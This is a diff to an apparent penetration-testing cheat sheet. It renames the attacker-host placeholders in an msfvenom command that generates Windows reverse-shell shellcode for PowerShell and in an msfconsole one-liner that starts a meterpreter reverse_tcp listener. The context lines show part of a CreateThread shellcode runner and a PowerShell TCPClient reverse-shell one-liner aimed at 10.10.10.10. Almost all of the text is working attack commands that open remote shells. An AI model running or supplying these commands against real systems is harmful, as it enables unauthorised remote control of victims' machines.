@@ -76,7 +76,7 @@ $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ### Shell code
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=IpAtt LPORT=PortAtt -f powershell -v sc
+msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f powershell -v sc
 ```
 
 ### One-liner
@@ -96,7 +96,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $c
 ### Msf listener
 
 ```
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST AttIP;set LPORT AttPort;run;"
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $AttackerIP;set LPORT $AttackerPort;run;"
 ```
 
 
